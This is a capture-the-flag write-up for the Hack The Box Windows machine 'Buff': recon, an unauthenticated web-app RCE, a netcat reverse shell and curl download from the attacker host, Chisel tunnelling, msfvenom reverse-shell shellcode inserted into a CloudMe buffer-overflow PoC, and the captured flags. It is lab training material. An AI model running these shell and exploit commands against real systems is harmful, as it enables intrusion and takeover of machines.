# CTF: Buff (HTB)

## Metadata

- **Target:** 10.129.2.18 (Windows: Buff)
    
- **Difficulty:** Easy
    
- **Date:** 2026-03-18
    
- **Key Skills/Tools:** Gym Management System 1.0 (RCE), Chisel (Reverse Port Forwarding), CloudMe 1.11.2 (Buffer Overflow), Msfvenom (Shellcode), Netcat.
    

---

## Introduction

Buff is an entry-level Windows machine that emphasizes the importance of monitoring local ports and third-party software versions. The exploit chain involves an unauthenticated RCE to gain a foothold, followed by a local port forward to reach a vulnerable buffer overflow target for administrative access.

### Key skills/tools

- **Chisel:** Essential for tunneling to internal/local-only ports.
    
- **Msfvenom:** Generating architecture-specific shellcode.
    
- **Buffer Overflow (BoF):** Manual exploit modification to replace PoC payloads.
    

---

## Reconnaissance

A full port scan was conducted to identify all entry points, followed by aggressive service versioning.

Bash

```
# Discovery scan
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt

# Service identification
nmap -Pn $target -sV -sC -p 7680,8080 -v -oN nmap_sVsC.txt
```

**Results:**

- **Port 8080:** Apache httpd 2.4.43 (Running Gym Management System 1.0).
    
- **Port 7680:** pando-pub (Commonly associated with Pando Media Booster).
    

---

## Foothold

The Gym Management System 1.0 was found to be vulnerable to unauthenticated RCE.

### 1. Exploitation (CVE-2020-11107)

Using the Python exploit script **48506.py** to drop a web shell.

Bash

```
searchsploit -m php/webapps/48506.py
python2 48506.py http://10.129.2.18:8080/
```

### 2. Shell Stabilization

Once a web shell was established as `buff\shaun`, a proper reverse shell was caught using `nc.exe`.

PowerShell

```
# Transfer netcat to the target
curl http://10.10.14.5:8000/nc.exe -o nc.exe

# Connect back to the attacker machine
nc.exe 10.10.14.5 8008 -e powershell.exe
```

---

## Pivoting (Chisel)

Enumeration of the Downloads folder revealed `CloudMe1112.exe`. Investigation showed the service listening only on the loopback interface (**127.0.0.1:8888**). **Chisel** was used to tunnel this port to the attacker machine.

### 1. Pivot Execution

Bash

```
# On Kali (Attacker)
chisel server -p 8001 --reverse

# On Target (Windows)
.\chisel.exe client 10.10.14.5:8001 R:8888:127.0.0.1:8888
```

---

## Privilege Escalation

The CloudMe 1.11.2 service is vulnerable to a stack-based buffer overflow. The public PoC (**48389.py**) was modified to include a working reverse shell payload.

### 1. Shellcode Generation

Bash

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -b '\x00\x0A\x0D' -f python
```

### 2. Exploit Modification

The generated `buf` was pasted into the exploit script. Critically, the `payload` variable had to be reassigned to the new `buf` at the end of the added section.

Python

```
# --- Added Shellcode Section ---
buf =  b""
buf += b"\xda\xd9\xb8\x9e\x1d\x06\x17\xd9\x74\x24\xf4\x5a"
# ... [rest of the buf] ...
buf += b"\xd1\xa2\x93"

payload = buf  # This line must be at the bottom of the addition
# -------------------------------
```

### 3. Execution

The exploit was fired at the forwarded port on the attacker's localhost.

Bash

```
python3 48389.py
```

**Access:** Administrative shell granted as `buff\administrator`.

---

## Flags

- **User:** `ec64ddda41bf6b5e02c6c6c9f7533d6e`
    
- **Root:** `d2424ef99b5729bb7ebed400552683dc`
